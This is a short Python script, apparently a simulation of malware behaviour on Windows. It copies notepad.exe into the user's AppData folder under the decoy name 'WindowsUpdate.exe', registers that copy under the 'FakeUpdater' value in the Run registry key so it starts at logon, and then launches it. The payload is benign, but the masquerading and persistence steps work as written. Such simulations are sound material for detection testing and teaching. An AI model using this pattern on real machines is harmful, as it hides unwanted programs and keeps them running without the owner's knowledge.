import os
import subprocess
import winreg
import shutil

# Step 1: Fake malware drop
malware_path = os.path.join(os.getenv("APPDATA"), "WindowsUpdate.exe")
shutil.copy("C:\\Windows\\System32\\notepad.exe", malware_path)

# Step 2: Registry persistence
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                     r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "FakeUpdater", 0, winreg.REG_SZ, malware_path)
winreg.CloseKey(key)

# Step 3: Execute it
subprocess.Popen([malware_path])
